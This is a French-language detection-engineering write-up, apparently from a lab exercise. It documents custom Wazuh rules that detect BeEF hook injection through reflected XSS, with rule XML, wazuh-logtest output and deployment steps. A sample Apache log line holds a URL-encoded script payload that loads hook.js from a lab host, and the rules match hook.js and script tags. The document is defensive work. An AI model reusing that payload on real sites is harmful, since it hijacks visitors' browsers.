# Ingénierie de Détection — Wazuh

> **Objectif** : Documenter la règle Wazuh personnalisée développée pour détecter l'injection d'un hook BeEF via XSS.

---

## 1. Contexte

Wazuh dispose de règles par défaut pour détecter les attaques web génériques (règle `31100`, niveau 6 "A web attack"). Cependant, ces règles ne permettent pas d'identifier **spécifiquement** une attaque BeEF.

**Objectif** : Créer une règle personnalisée qui :
- Détecte la présence de `hook.js` dans une URL
- Déclenche une alerte de **niveau 12** (Critique)
- Mappe sur **MITRE ATT&CK T1185**

---

## 2. Règle Personnalisée

Fichier : [`detection-rules/local_rules.xml`](../detection-rules/local_rules.xml)

```xml
<group name="web,appsec,xss,beef,">

  <rule id="100100" level="12">
    <if_sid>31100</if_sid>
    <url>hook.js</url>
    <description>Possible BeEF hook injection detected - Browser Session Hijacking</description>
    <mitre>
      <id>T1185</id>
    </mitre>
    <group>beef_hook,</group>
  </rule>

  <rule id="100101" level="10">
    <if_sid>31100</if_sid>
    <match>&lt;script&gt;</match>
    <description>XSS attempt detected in URL</description>
    <mitre>
      <id>T1059.007</id>
    </mitre>
    <group>xss_attempt,</group>
  </rule>

</group>
```

---

## 3. Explication de la Règle

| Balise | Valeur | Signification |
|---|---|---|
| `id="100100"` | 100100 | ID dans la plage utilisateur (100000-120000) |
| `level="12"` | 12/15 | Sévérité CRITIQUE |
| `<if_sid>31100</if_sid>` | 31100 | Se base sur la règle Apache parente |
| `<url>hook.js</url>` | hook.js | Cherche dans le champ `url` décodé |
| `<mitre><id>T1185</id></mitre>` | T1185 | Mapping MITRE ATT&CK |

---

## 4. Test de la Règle

### 4.1 — Test avec un log réel

Utilisation de `wazuh-logtest` avec un vrai log Apache :

```bash
/var/ossec/bin/wazuh-logtest
```

**Log injecté** :
```
192.168.56.10 - - [06/Oct/2026:10:48:16 +0000] "GET /vulnerabilities/xss_r/?name=%3Cscript+src%3D%22http%3A%2F%2F192.168.56.10%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E HTTP/1.1" 200 1792 "http://192.168.56.20/vulnerabilities/xss_r/" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
```

**Résultat** :
```
**Phase 2: Completed decoding.
        name: 'web-accesslog'
        srcip: '192.168.56.10'
        url: '/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22...hook.js...'

**Phase 3: Completed filtering (rules).
        id: '100100'
        level: '12'
        description: 'Possible BeEF hook injection detected - Browser Session Hijacking'
        mitre.id: ['T1185']
        mitre.tactic: ['Collection']
        mitre.technique: ['Browser Session Hijacking']
**Alert to be generated.
```

✅ **La règle fonctionne.**

### 4.2 — Validation en production

Après relance de l'attaque, l'alerte apparaît dans **Wazuh Discover** :

| Champ | Valeur |
|---|---|
| `rule.id` | `100100` |
| `rule.level` | `12` |
| `rule.description` | `Possible BeEF hook injection detected` |
| `agent.name` | `10` |
| `data.srcip` | `192.168.56.10` |
| `data.url` | `/vulnerabilities/xss_r/?name=...hook.js...` |

---

## 5. Déploiement

### 5.1 — Sur le manager

```bash
# Ajouter la règle
nano /var/ossec/etc/rules/local_rules.xml
# (coller le contenu ci-dessus)

# Vérifier le XML
xmllint --noout /var/ossec/etc/rules/local_rules.xml

# Redémarrer
/var/ossec/bin/wazuh-control restart

# Vérifier le chargement
grep "Total rules" /var/ossec/logs/ossec.log | tail -1
```

### 5.2 — Sur d'autres managers

La règle peut être déployée sur tous les managers Wazuh du parc via :
- Gestion centralisée (Wazuh API)
- Configuration management (Ansible, Puppet)
- Copie manuelle du fichier

---

## 6. Réduction des Faux Positifs

La règle `100100` cible **spécifiquement** `hook.js`, ce qui limite les faux positifs. Pour aller plus loin :

- **Whitelister** les domaines de confiance (ex : CDN légitimes)
- **Corréler** avec d'autres alertes (scan réseau, exfiltration)
- **Enrichir** avec la réputation de l'IP source

---

## 7. Améliorations Possibles

| Amélioration | Bénéfice |
|---|---|
| Ajouter une règle pour `/hook.js` en POST | Couvre d'autres vecteurs |
| Détecter les callbacks BeEF (WebSocket) | Détection au niveau réseau |
| Intégrer un CTI (Threat Intelligence) | Enrichissement automatique |
| Ajouter une règle Sigma équivalente | Portabilité vers d'autres SIEM |

---

## 8. Références

- [Wazuh Rules Syntax](https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html)
- [MITRE ATT&CK T1185](https://attack.mitre.org/techniques/T1185/)
- [BeEF Project](https://beefproject.com/)
